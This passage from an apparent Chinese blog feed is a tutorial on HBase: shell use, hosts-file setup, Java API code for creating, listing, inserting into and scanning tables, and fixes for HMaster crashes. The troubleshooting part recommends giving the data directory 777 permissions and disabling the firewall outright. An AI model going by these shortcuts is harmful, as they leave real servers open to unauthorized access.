shell</h2><p>hbase提供了一个shell的终端给用户交互。使用命令<code>hbase shell</code>进入命令界面。通过执行 help可以看到命令的帮助信息。<br><img src="https://i.loli.net/2019/04/10/5cadd10ebdb15.png" alt><br>下图列出常用命令<br><img src="https://i.loli.net/2019/04/10/5cadd0c240b73.png" alt><br>更过命令操作可参考<a href="http://www.ityouknow.com/hbase/2017/07/28/hbase-shell.html" target="_blank" rel="noopener">HBase shell 命令介绍</a></p><h2 id="0x04-Java-API连接Hbase"><a href="#0x04-Java-API连接Hbase" class="headerlink" title="0x04 Java API连接Hbase"></a>0x04 Java API连接Hbase</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>因为Hbase 16000端口绑定为127.0.0.1,所以通过其他主机无法访问，这里唯一的解决方法是修改hosts文件<br>修改linux hostname<br><code>sudo vi /etc/sysconfig/network</code><br>添加以下内容<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">NETWORKING</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">HOSTNAME</span>=master</span><br></pre></td></tr></table></figure></p><p>修改linux hosts<br><code>su vi /etc/hosts</code><br>添加以下内容</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">111.147</span> <span class="keyword">master</span> <span class="title">#此处ip</span>添加你的linux ip,hostname填写上面修改的,我这里设置为<span class="literal">master</span>。</span><br></pre></td></tr></table></figure><p>linux配置完成后需重启系统，以使配置生效。</p><p>修改windows hosts文件<br>路径为：<code>C:\Windows\System32\drivers\etc\hosts</code><br>该文件无权限直接修改，需复制出修改完再覆盖掉<br>最后添加一行<code>192.168.111.147 master</code>，同样此处应与上面相同。<br>配置完成后即可继续下面使用java api连接，不配置可能会导致无法连接。</p><h3 id="JAVA-API"><a href="#JAVA-API" class="headerlink" title="JAVA API"></a>JAVA API</h3><p>关于java项目创建参见<a href="https://zhengbao.wang/%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS/">使用Hadoop JAVA API 远程连接HDFS</a><br>在<code>pom.xml</code>中添加<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>将<code>Hbase-site.xml</code>添加到项目中，如下图<br><img src="https://i.loli.net/2019/04/10/5cadd27c93491.png" alt><br>新建<code>HBase</code>类，内容如下<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package hadoop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HBaseConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HColumnDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HTableDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.TableName;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Admin;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Connection;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.ConnectionFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Configuration</span> conf;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Connection</span> connection;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Admin</span> admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="type">String</span>[] args) <span class="keyword">throws</span> <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">        conf = <span class="type">HBaseConfiguration</span>.create();</span><br><span class="line">        conf.<span class="keyword">set</span>(<span class="string">"hbase.master"</span>, <span class="string">"192.168.111.147:16000"</span>);</span><br><span class="line"></span><br><span class="line">        connection = <span class="type">ConnectionFactory</span>.createConnection(conf);</span><br><span class="line">        admin = connection.getAdmin();</span><br><span class="line"></span><br><span class="line">        <span class="type">HTableDescriptor</span> table = new <span class="type">HTableDescriptor</span>(<span class="type">TableName</span>.valueOf(<span class="string">"table1"</span>));</span><br><span class="line">        table.addFamily(new <span class="type">HColumnDescriptor</span>(<span class="string">"group1"</span>)); <span class="comment">//创建表时至少加入一个列组</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(admin.tableExists(table.getTableName()))&#123;</span><br><span class="line">            admin.disableTable(table.getTableName());</span><br><span class="line">            admin.deleteTable(table.getTableName());</span><br><span class="line">        &#125;</span><br><span class="line">        admin.createTable(table);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行成功后成功创建<code>table1</code>表<br><img src="https://i.loli.net/2019/04/10/5cadd32dd372a.png" alt><br>转到Hbase shell使用list命令可看到新表已创建<br><img src="https://i.loli.net/2019/04/10/5cadd36ad4bda.png" alt></p><h3 id="详细代码"><a href="#详细代码" class="headerlink" title="详细代码"></a>详细代码</h3><p>将常用hbase api封装好了，直接在main函数中调用即可。<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">package hadoop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.<span class="built_in">File</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.Cell;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.CellUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HBaseConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HColumnDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.HTableDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.TableName;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Admin;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Connection;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Delete;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Get;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Put;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Result;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.ResultScanner;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Scan;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.util.Bytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class HbaseTest &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Configuration configuration;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection connection;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Admin admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) throws IOException &#123;</span><br><span class="line">        <span class="comment">//createTable("t2", new String[] &#123; "cf1", "cf2" &#125;);</span></span><br><span class="line">        listTables();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * insterRow("t2", "rw1", "cf1", "q1", "val1"); getData("t2", "rw1",</span></span><br><span class="line"><span class="comment">         * "cf1", "q1"); scanData("t2", "rw1", "rw2");</span></span><br><span class="line"><span class="comment">         * deleRow("t2","rw1","cf1","q1"); deleteTable("t2");</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化链接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> init() &#123;</span><br><span class="line">        configuration = HBaseConfiguration.create();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * configuration.set("hbase.zookeeper.quorum",</span></span><br><span class="line"><span class="comment">         * "10.10.3.181,10.10.3.182,10.10.3.183");</span></span><br><span class="line"><span class="comment">         * configuration.set("hbase.zookeeper.property.clientPort","2181");</span></span><br><span class="line"><span class="comment">         * configuration.set("zookeeper.znode.parent","/hbase");</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//configuration.set("hbase.zookeeper.property.clientPort", "2181");</span></span><br><span class="line">        <span class="comment">//configuration.set("hbase.zookeeper.quorum", "192.168.111.151");</span></span><br><span class="line">        configuration.set(<span class="string">"hbase.master"</span>, <span class="string">"192.168.111.151:16000"</span>);</span><br><span class="line">        <span class="built_in">File</span> workaround = <span class="keyword">new</span> <span class="built_in">File</span>(<span class="string">"."</span>);</span><br><span class="line">        System.getProperties().<span class="built_in">put</span>(<span class="string">"hadoop.home.dir"</span>,</span><br><span class="line">                workaround.getAbsolutePath());</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">File</span>(<span class="string">"./bin"</span>).mkdirs();</span><br><span class="line">        <span class="built_in">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="built_in">File</span>(<span class="string">"./bin/test"</span>).createNewFile();</span><br><span class="line">        &#125; <span class="built_in">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">try</span> &#123;</span><br><span class="line">            connection = ConnectionFactory.createConnection(configuration);</span><br><span class="line">            admin = connection.getAdmin();</span><br><span class="line">        &#125; <span class="built_in">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="built_in">close</span>() &#123;</span><br><span class="line">        <span class="built_in">try</span> &#123;</span><br><span class="line">            <span class="built_in">if</span> (null != admin)</span><br><span class="line">                admin.<span class="built_in">close</span>();</span><br><span class="line">            <span class="built_in">if</span> (null != connection)</span><br><span class="line">                connection.<span class="built_in">close</span>();</span><br><span class="line">        &#125; <span class="built_in">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> createTable(<span class="keyword">String</span> tableNmae, <span class="keyword">String</span>[] cols) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        init();</span><br><span class="line">        TableName tableName = TableName.valueOf(tableNmae);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">if</span> (admin.tableExists(tableName)) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(<span class="string">"talbe is exists!"</span>);</span><br><span class="line">        &#125; <span class="built_in">else</span> &#123;</span><br><span class="line">            HTableDescriptor hTableDescriptor = <span class="keyword">new</span> HTableDescriptor(tableName);</span><br><span class="line">            <span class="built_in">for</span> (<span class="keyword">String</span> col : cols) &#123;</span><br><span class="line">                HColumnDescriptor hColumnDescriptor = <span class="keyword">new</span> HColumnDescriptor(col);</span><br><span class="line">                hTableDescriptor.addFamily(hColumnDescriptor);</span><br><span class="line">            &#125;</span><br><span class="line">            admin.createTable(hTableDescriptor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> deleteTable(<span class="keyword">String</span> tableName) throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        TableName tn = TableName.valueOf(tableName);</span><br><span class="line">        <span class="built_in">if</span> (admin.tableExists(tn)) &#123;</span><br><span class="line">            admin.disableTable(tn);</span><br><span class="line">            admin.deleteTable(tn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看已有表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> listTables() throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        HTableDescriptor hTableDescriptors[] = admin.listTables();</span><br><span class="line">        <span class="built_in">for</span> (HTableDescriptor hTableDescriptor : hTableDescriptors) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(hTableDescriptor.getNameAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> insterRow(<span class="keyword">String</span> tableName, <span class="keyword">String</span> rowkey, <span class="keyword">String</span> colFamily, <span class="keyword">String</span> col, <span class="keyword">String</span> val)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Table table = connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        Put <span class="built_in">put</span> = <span class="keyword">new</span> Put(Bytes.toBytes(rowkey));</span><br><span class="line">        <span class="built_in">put</span>.addColumn(Bytes.toBytes(colFamily), Bytes.toBytes(col), Bytes.toBytes(val));</span><br><span class="line">        table.<span class="built_in">put</span>(<span class="built_in">put</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 批量插入</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * List&lt;Put&gt; putList = new ArrayList&lt;Put&gt;(); puts.add(put);</span></span><br><span class="line"><span class="comment">         * table.put(putList);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        table.<span class="built_in">close</span>();</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> deleRow(<span class="keyword">String</span> tableName, <span class="keyword">String</span> rowkey, <span class="keyword">String</span> colFamily, <span class="keyword">String</span> col) throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Table table = connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        Delete <span class="keyword">delete</span> = <span class="keyword">new</span> Delete(Bytes.toBytes(rowkey));</span><br><span class="line">        <span class="comment">// 删除指定列族</span></span><br><span class="line">        <span class="comment">// delete.addFamily(Bytes.toBytes(colFamily));</span></span><br><span class="line">        <span class="comment">// 删除指定列</span></span><br><span class="line">        <span class="comment">// delete.addColumn(Bytes.toBytes(colFamily),Bytes.toBytes(col));</span></span><br><span class="line">        table.<span class="keyword">delete</span>(<span class="keyword">delete</span>);</span><br><span class="line">        <span class="comment">// 批量删除</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * List&lt;Delete&gt; deleteList = new ArrayList&lt;Delete&gt;();</span></span><br><span class="line"><span class="comment">         * deleteList.add(delete); table.delete(deleteList);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        table.<span class="built_in">close</span>();</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据rowkey查找数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> getData(<span class="keyword">String</span> tableName, <span class="keyword">String</span> rowkey, <span class="keyword">String</span> colFamily, <span class="keyword">String</span> col) throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Table table = connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        Get <span class="built_in">get</span> = <span class="keyword">new</span> Get(Bytes.toBytes(rowkey));</span><br><span class="line">        <span class="comment">// 获取指定列族数据</span></span><br><span class="line">        <span class="comment">// get.addFamily(Bytes.toBytes(colFamily));</span></span><br><span class="line">        <span class="comment">// 获取指定列数据</span></span><br><span class="line">        <span class="comment">// get.addColumn(Bytes.toBytes(colFamily),Bytes.toBytes(col));</span></span><br><span class="line">        Result result = table.<span class="built_in">get</span>(<span class="built_in">get</span>);</span><br><span class="line"></span><br><span class="line">        showCell(result);</span><br><span class="line">        table.<span class="built_in">close</span>();</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 格式化输出</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> showCell(Result result) &#123;</span><br><span class="line">        Cell[] cells = result.rawCells();</span><br><span class="line">        <span class="built_in">for</span> (Cell cell : cells) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(<span class="string">"RowName:"</span> + <span class="keyword">new</span> <span class="keyword">String</span>(CellUtil.cloneRow(cell)) + <span class="string">" "</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(<span class="string">"Timetamp:"</span> + cell.getTimestamp() + <span class="string">" "</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(<span class="string">"column Family:"</span> + <span class="keyword">new</span> <span class="keyword">String</span>(CellUtil.cloneFamily(cell)) + <span class="string">" "</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(<span class="string">"row Name:"</span> + <span class="keyword">new</span> <span class="keyword">String</span>(CellUtil.cloneQualifier(cell)) + <span class="string">" "</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(<span class="string">"value:"</span> + <span class="keyword">new</span> <span class="keyword">String</span>(CellUtil.cloneValue(cell)) + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 批量查找数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> scanData(<span class="keyword">String</span> tableName, <span class="keyword">String</span> startRow, <span class="keyword">String</span> stopRow) throws IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Table table = connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        Scan scan = <span class="keyword">new</span> Scan();</span><br><span class="line">        <span class="comment">// scan.setStartRow(Bytes.toBytes(startRow));</span></span><br><span class="line">        <span class="comment">// scan.setStopRow(Bytes.toBytes(stopRow));</span></span><br><span class="line">        ResultScanner resultScanner = table.getScanner(scan);</span><br><span class="line">        <span class="built_in">for</span> (Result result : resultScanner) &#123;</span><br><span class="line">            showCell(result);</span><br><span class="line">        &#125;</span><br><span class="line">        table.<span class="built_in">close</span>();</span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x05-问题解决"><a href="#0x05-问题解决" class="headerlink" title="0x05 问题解决"></a>0x05 问题解决</h2><p>此处容易出现的问题为<code>HMaster</code>启动后闪退。<br>可通过查看hbase安装目录下的<code>logs</code>文件内log日志确定该问题。</p><h3 id="HDFS问题"><a href="#HDFS问题" class="headerlink" title="HDFS问题"></a>HDFS问题</h3><p>  首先查看<code>hbase-wzb-master-wzb_node1.log</code>，此处查看你的<code>master</code>日志文件<br><img src="https://i.loli.net/2019/04/10/5cad60b6d5103.png" alt><br>发现9000的HDFS连接失败<br>首先浏览器访问你的ip的9000端口，即<code>hdfs</code>服务，访问成功如下图<br><img src="https://i.loli.net/2019/04/10/5cad5cb6557ef.png" alt><br>如果未访问成功，查看hadoop配置文件<code>core-site.xml</code><br><img src="https://i.loli.net/2019/04/10/5cad5fde7f4e3.png" alt><br>查看hdfs是否正确配置为你的ip，不是请修改，确保hbase配置文件中连接的hdfs服务器与你启动的服务器路径相同。<br>配置成功后重启hadoop，再次访问</p><h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><p>同样查看日志问题，如发现前面配置的Hbase文件夹有权限问题，请将Hbase文件夹赋予777权限<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomd <span class="number">777</span> Hbase <span class="comment">//此处Hbase请添加你hbase-site.xml中配置的hbase.zookeeper.property.dataDir目录</span></span><br></pre></td></tr></table></figure></p><h3 id="zookeeper未正常启动问题"><a href="#zookeeper未正常启动问题" class="headerlink" title="zookeeper未正常启动问题"></a>zookeeper未正常启动问题</h3><p>查看<code>hbase-wzb-regionserver-wzb_node1.log</code>此处应修改为你的<code>regionserve</code>log文件<br>出现以下错误说明<code>zookeeper</code>未启动成功。<br><img src="https://i.loli.net/2019/04/10/5cad5e8b86672.png" alt><br>首先查看<code>sudo netstat -anp | grep 2181</code>端口是否被占用，如果占用，找到占用程序并kill掉相关进程。</p><h3 id="防火墙问题"><a href="#防火墙问题" class="headerlink" title="防火墙问题"></a>防火墙问题</h3><p>如果出现其他端口无法访问问题，请关闭防火墙<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">stop</span> firewalld.service <span class="meta">#停止firewall</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">disable</span> firewalld.service <span class="meta">#禁止firewall开机启动</span></span><br></pre></td></tr></table></figure></p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>配置过程中可能出现其他各种问题，可查看log文件出现的问题并解决。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hbase全称为Hadoop Database，是一个分布式的存储系统。Hbase使用Hadoop的
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
      <category term="hbase" scheme="https://zhengbao.wang/tags/hbase/"/>
    
  </entry>
  
  <entry>
    <title>Hadoop之MapReduce编程</title>
    <link href="https://zhengbao.wang/Hadoop%E4%B9%8BMapReduce%E7%BC%96%E7%A8%8B/"/>
    <id>https://zhengbao.wang/Hadoop之MapReduce编程/</id>
    <published>2019-04-08T02:45:24.000Z</published>
    <updated>2019-05-08T02:51:28.295Z</updated>
    
